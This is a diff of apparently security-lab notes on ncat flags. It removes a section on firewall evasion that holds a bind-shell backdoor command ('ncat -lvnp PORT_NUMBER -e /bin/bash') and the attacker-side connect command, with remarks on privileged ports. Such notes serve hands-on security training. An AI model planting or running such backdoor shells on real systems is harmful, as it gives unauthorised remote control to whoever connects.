@@ -16,13 +16,3 @@ Options:
   -u   Listen using UDP
   -e, --exec    Executes the given command
   /bin/bash     Location of the command we want to execute
-
-Evasion Using Non-Standard Ports:
-  ncat -lvnp PORT_NUMBER -e /bin/bash
-                    Creates a backdoor via the specified port number that lets you interact with the Bash shell
-  ncat MACHINE_IP PORT_NUMBER
-                    On the AttackBox, we can run ncat to connect to the target machine and interact with its shell
-                    Considering the case that we have a firewall, it is not enough to use `ncat` to create a backdoor
-                    unless we can connect to the listening port number. Moreover, unless we run `ncat` as a
-                    privileged user, `root`, or using `sudo`, we cannot use port numbers below `1024`
-
